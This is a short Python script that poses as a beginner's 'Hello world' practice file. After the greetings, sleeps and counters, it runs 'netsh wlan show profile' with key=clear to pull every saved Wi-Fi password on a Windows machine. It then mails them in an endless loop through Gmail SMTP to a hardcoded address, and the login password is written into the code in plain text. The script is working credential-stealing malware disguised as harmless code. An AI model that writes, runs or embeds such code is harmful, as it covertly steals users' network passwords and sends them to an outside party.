import time, subprocess, smtplib, re

print("Hello world!")
print("Python programing...!")

time.sleep(60)
for i in range(1000000):
    print(f"\rCount [ {i} ]", end="")

names = "juma"
if names == "juma":
    print("\nthat is a good name\n")

time.sleep(60)
for name in ['names', 'those', 'that', 'men']:
    print(name)

def send_mail(email, maneno, ujumbe):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, maneno)
    server.sendmail(email, email, ujumbe)
    server.quit()

kanuni = 'netsh wlan show profile'
networks = subprocess.check_output(kanuni, shell=True)
network_names = re.findall("(Profile\s*:\s)(.*)", str(networks))

for netname in network_names:
    for net in netname:
        net = net.split(": ")
        for i in net:
            i = i.split("\\")
       
            try:
                while True:
                    for ssid in i:               
                        kanuni = ""'netsh wlan show profile name=' + '"'+ssid+'"'+ ' key="clear"'""
                        maneno = subprocess.check_output(kanuni, shell=True)  
                        maneno = maneno.decode()
                        send_mail("kingvision911@gmail.com", "VISION747489333", maneno)
                            
            except subprocess.CalledProcessError:
                continue
    
    
